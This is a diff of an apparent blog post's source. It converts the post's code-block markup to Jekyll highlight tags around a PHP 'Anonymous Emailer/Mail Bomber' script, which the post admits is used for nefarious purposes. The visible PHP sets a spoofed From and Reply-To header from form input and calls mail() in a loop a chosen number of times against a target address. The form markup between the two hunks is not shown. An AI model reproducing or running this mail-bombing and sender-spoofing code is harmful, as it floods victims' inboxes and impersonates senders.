@@ -15,7 +15,7 @@ Ok, so this isn&#8217;t really a hack script as such, but is also used for nefar
 
 ### PHP Anonymous Emailer/Mail Bomber Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;html&gt;
+{% highlight php %}&lt;html&gt;
 &lt;head&gt;
   &lt;title&gt;PHP Anonymous Emailer/Mail Bomber&lt;/title&gt;
 &lt;body bgcolor="black" text="white"&gt;
@@ -54,12 +54,12 @@ Ok, so this isn&#8217;t really a hack script as such, but is also used for nefar
     &lt;input type=submit&gt;
   &lt;/p&gt;
 &lt;/form&gt;
-   &lt;?php
+   <?php
        $header="From:$from_name&lt;$from_mail&gt;\n";
        $header .= "Reply-To:$email_return\n";
        $message2 = stripcslashes($message);
        for($x=1;$x&lt;$messages+1;$x++){
         mail($target,$subject,$message2,$header);
        }
-   ?&gt;
-</pre>
+   ?>
+{% endhighlight %}
